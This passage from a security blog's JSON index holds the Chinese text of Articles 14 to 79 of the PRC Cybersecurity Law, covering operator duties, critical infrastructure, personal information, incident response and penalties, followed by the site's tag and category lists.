第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 第二章 网络安全支持与促进 第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。 国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。 第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。 第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。 大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 第三章 网络运行安全 第一节 一般规定 第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改： （一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； （二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； （三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； （四）采取数据分类、重要数据备份和加密等措施； （五）法律、行政法规规定的其他义务。 第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。 网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。 国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。 第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。 有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。 第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： （一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； （二）定期对从业人员进行网络安全教育、技术培训和技能考核； （三）对重要系统和数据库进行容灾备份； （四）制定网络安全事件应急预案，并定期进行演练； （五）法律、行政法规规定的其他义务。 第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： （一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估； （二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力； （三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享； （四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 第四章 网络信息安全 第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。 网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。 网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。 电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。 第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。 第五章 监测预警与应急处置 第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。 负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。 网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施： （一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； （二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； （三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。 第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。 第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 第六章 法律责任 第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。 关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： （一）设置恶意程序的； （二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； （三）擅自终止为其产品、服务提供安全维护的。 第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。 第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。 违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。 单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款： （一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； （二）拒绝、阻碍有关部门依法实施的监督检查的； （三）拒不向公安机关、国家安全机关提供技术支持和协助的。 第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。 网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。 违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。 第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。 第七章 附则 第七十六条 本法下列用语的含义： （一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 （二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 （三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 （四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 （五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。 第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。 第七十八条 军事网络的安全保护，由中央军事委员会另行规定。 第七十九条 本法自2017年6月1日起施行。","link":"/2017/06/01/中华人民共和国网络安全法/"}],"tags":[{"name":"00截断","slug":"00截断","link":"/tags/00截断/"},{"name":"小技巧","slug":"小技巧","link":"/tags/小技巧/"},{"name":"旅行","slug":"旅行","link":"/tags/旅行/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL注入/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"YIT-CTF","slug":"YIT-CTF","link":"/tags/YIT-CTF/"},{"name":"BurpSuite","slug":"BurpSuite","link":"/tags/BurpSuite/"},{"name":"HTML","slug":"HTML","link":"/tags/HTML/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"JAVA","slug":"JAVA","link":"/tags/JAVA/"},{"name":"Nginx","slug":"Nginx","link":"/tags/Nginx/"},{"name":"PDF预览","slug":"PDF预览","link":"/tags/PDF预览/"},{"name":"SQLi Labs","slug":"SQLi-Labs","link":"/tags/SQLi-Labs/"},{"name":"Sqlmap","slug":"Sqlmap","link":"/tags/Sqlmap/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"密码学","slug":"密码学","link":"/tags/密码学/"},{"name":"隐写术","slug":"隐写术","link":"/tags/隐写术/"},{"name":"网站建设","slug":"网站建设","link":"/tags/网站建设/"},{"name":"随想","slug":"随想","link":"/tags/随想/"},{"name":"弱口令","slug":"弱口令","link":"/tags/弱口令/"},{"name":"yilia主题","slug":"yilia主题","link":"/tags/yilia主题/"},{"name":"正则表达式","slug":"正则表达式","link":"/tags/正则表达式/"},{"name":"WIN提权","slug":"WIN提权","link":"/tags/WIN提权/"},{"name":"GetShell","slug":"GetShell","link":"/tags/GetShell/"},{"name":"Https","slug":"Https","link":"/tags/Https/"},{"name":"钓鱼","slug":"钓鱼","link":"/tags/钓鱼/"},{"name":"电音","slug":"电音","link":"/tags/电音/"},{"name":"路由器","slug":"路由器","link":"/tags/路由器/"},{"name":"Short filename","slug":"Short-filename","link":"/tags/Short-filename/"},{"name":"内网渗透","slug":"内网渗透","link":"/tags/内网渗透/"},{"name":"端口渗透","slug":"端口渗透","link":"/tags/端口渗透/"},{"name":"解析漏洞","slug":"解析漏洞","link":"/tags/解析漏洞/"},{"name":"面试经验","slug":"面试经验","link":"/tags/面试经验/"},{"name":"网络安全法","slug":"网络安全法","link":"/tags/网络安全法/"}],"categories":[{"name":"WEB安全","slug":"WEB安全","link":"/categories/WEB安全/"},{"name":"杂七杂八","slug":"杂七杂八","link":"/categories/杂七杂八/"},{"name":"生活随笔","slug":"生活随笔","link":"/categories/生活随笔/"},{"name":"APT相关","slug":"APT相关","link":"/categories/APT相关/"},{"name":"网站建设","slug":"网站建设","link":"/categories/网站建设/"},{"name":"编程开发","slug":"编程开发","link":"/categories/编程开发/"},{"name":"CTF经验","slug":"CTF经验","link":"/categories/CTF经验/"},{"name":"日常搞机","slug":"日常搞机","link":"/categories/日常搞机/"},{"name":"内网渗透","slug":"内网渗透","link":"/categories/内网渗透/"},{"name":"网络安全","slug":"网络安全","link":"/categories/网络安全/"}]}